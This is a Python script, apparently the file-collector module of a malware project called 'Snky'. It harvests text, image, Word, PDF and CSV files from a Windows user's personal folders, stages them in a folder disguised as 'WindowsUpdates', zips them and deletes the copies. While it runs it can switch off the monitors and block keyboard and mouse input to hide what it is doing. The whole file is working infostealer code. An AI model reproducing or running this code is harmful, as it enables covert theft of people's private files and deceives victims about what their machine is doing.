from shutil import copy
from shutil import make_archive
import os
import json

import monitorcontrol
import pynput

target_path_txt = rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\txt"
target_path_images = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\images"
target_path_docx = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\docx"
target_path_psw = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\csv"

txt = []
pics = []
docx = []
pdf = []
csv = []

if os.path.exists(f"{os.getenv('LOCALAPPDATA')}/Snky/Snky-main/cfg/file_collector_config.json"):
    with open(f"{os.getenv('LOCALAPPDATA')}/Snky/Snky-main/cfg/file_collector_config.json", "r") as f:
        config = json.load(f)

if config.get("input_blocking") == True:
    kb_listener = pynput.keyboard.Listener(suppress=True)
    m_listener = pynput.mouse.Listener(suppress=True)

def main():
    if config.get("monitor_control") == True:
        for monitor in monitorcontrol.get_monitors():
            try:
                with monitor:
                    monitor.set_power_mode(4)
            except Exception as e:
                print(e)
    if config.get("input_blocking") == True:
        kb_listener.start()
        m_listener.start()

    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
    downloads = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads')
    pictures = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Pictures')
    videos = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Videos')
    music = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Music')
    get_files(desktop)
    get_files(downloads)
    get_files(documents)
    get_files(pictures)
    get_files(videos)
    get_files(music)

def get_files(path):
    global txt, pics, docx, pdf, csv
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.endswith(".txt"):
                txt.append(os.path.join(root, file))
            elif file.endswith(".png") or file.endswith(".jpg") or file.endswith(".jpeg") or file.endswith(".webp"):
                if config["collect_pictures"]:
                    pics.append(os.path.join(root, file))
            elif file.endswith(".docx"):
                docx.append(os.path.join(root, file))
            elif file.endswith(".pdf"):
                pdf.append(os.path.join(root, file))
            elif file.endswith(".csv"):
                csv.append(os.path.join(root, file))
            if os.path.isdir(file):
                get_files(file)
    
    for file in txt:
        copy(file, target_path_txt)
    for file in pics:
        if config["collect_pictures"]:
            copy(file, target_path_images)
    for file in docx:
        copy(file, target_path_docx)
    for file in pdf:
        copy(file, target_path_docx)
    for file in csv:
        copy(file, target_path_psw)

def remove_remnants():
    for root, dirs, files in os.walk(f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files"):
        for file in files:
            os.remove(os.path.join(root, file))




main()
make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files")
remove_remnants()

if config.get("monitor_control") == True:
        for monitor in monitorcontrol.get_monitors():
            try:
                with monitor:
                    monitor.set_power_mode(1)
            except Exception as e:
                print(e)

if config.get("input_blocking") == True:
    kb_listener.stop()
    m_listener.stop()